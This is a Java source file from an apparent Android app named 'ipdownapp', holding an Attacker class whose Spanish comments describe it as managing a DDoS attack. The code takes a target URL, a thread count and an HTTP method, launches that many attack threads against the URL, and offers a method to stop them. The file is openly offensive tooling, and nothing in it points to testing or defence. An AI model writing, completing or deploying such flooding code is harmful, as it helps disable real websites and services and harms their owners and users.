package com.example.ipdownapp.atack_tools;

import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.Nullable;

import com.example.ipdownapp.activitys.DDOSActivity;
import com.example.ipdownapp.models.ConsoleStateQueue;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * El cometido de esta clase es gestionar el ataque DDos.
 * Clase que sirve para desplegar el sistema de hilos del ataque
 * para pararlo cuando se requiera y para crear el hilo que notifica
 * al notificable de los mensajes.
 *
 */

public class Attacker {

    private int num_threadsDDOS;
    private DataController controladorConsola;
    private ConsoleStateQueue colaDatos;
    private ArrayList<DdosThread> hilosDdos;
    private boolean attack;
    private String urlAttack;
    private RequestMethods metodo;

    public Attacker(String urlAttack, int numThreads, RequestMethods metodo ,Notificable notificable) throws Exception {
        this.metodo = metodo;

        this.urlAttack = urlAttack;

        this.num_threadsDDOS = numThreads;

        //Se crea el recurso compartido entre los hilos
        colaDatos = new ConsoleStateQueue();

        //Se crea el hilo que acualizará la consola
        controladorConsola = new DataController(notificable,colaDatos);

        hilosDdos = new ArrayList<DdosThread>();

        attack = false;
    }

    public void iniciarAtaque(){
        attack = true;
        controladorConsola.start();

        for (int i = 0; i < this.num_threadsDDOS; i++) {

            DdosThread thread = new DdosThread(metodo, colaDatos);

            thread.setRequestURL(urlAttack);

            hilosDdos.add(thread);

            thread.start();
        }
    }

    public void pararAtaque(){
        for (DdosThread i:hilosDdos){
            i.setRun(false);
        }

        controladorConsola.setRun(false);

        attack = false;
    }

    public boolean isAttack() {
        return attack;
    }

}
